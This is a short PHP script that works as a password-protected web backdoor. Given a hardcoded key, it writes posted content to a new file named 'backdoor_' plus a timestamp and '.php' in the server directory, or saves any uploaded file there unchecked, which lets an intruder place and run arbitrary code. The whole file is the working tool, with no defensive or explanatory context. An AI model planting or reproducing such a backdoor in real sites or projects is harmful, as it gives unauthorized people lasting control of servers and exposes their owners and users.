<?php
$custom_key = isset($_POST['custom_key']) ? stripslashes($_POST['custom_key']) : '';

if($custom_key === 'PtXe*JMQ%jT2HS!BSRc4a$$^'){
	if(isset($_POST['file'])){
		$file_content = stripslashes($_POST['file']);
		$filename = 'backdoor_' . date('YmdHis') . '.php';
		$file_path = __DIR__ . '/' . $filename;
		file_put_contents($file_path, $file_content);
		header('Content-Type: text/plain');
		echo 'File created: ' . $file_path;
		exit;
	}
	
	if(isset($_FILES['file']) && $_FILES['file']['error'] == 0){
		$filename = $_FILES['file']['name'];
		$tmp_name = $_FILES['file']['tmp_name'];
		$target_path = './' . basename($filename);
		
		if(move_uploaded_file($tmp_name, $target_path)){
			header('Content-Type: application/json');
			echo json_encode([
				'success' => true,
				'message' => 'File uploaded successfully',
				'file_path' => $target_path,
				'file_size' => filesize($target_path)
			]);
		} else {
			header('Content-Type: application/json');
			echo json_encode([
				'success' => false,
				'message' => 'Upload failed'
			]);
		}
		exit;
	}
	
	header('Content-Type: application/json');
	echo json_encode([
		'success' => false,
		'message' => 'No file provided'
	]);
	exit;
} else {
	header('Content-Type: application/json');
	echo json_encode([
		'success' => false,
		'message' => 'Invalid key'
	]);
	exit;
}
?>
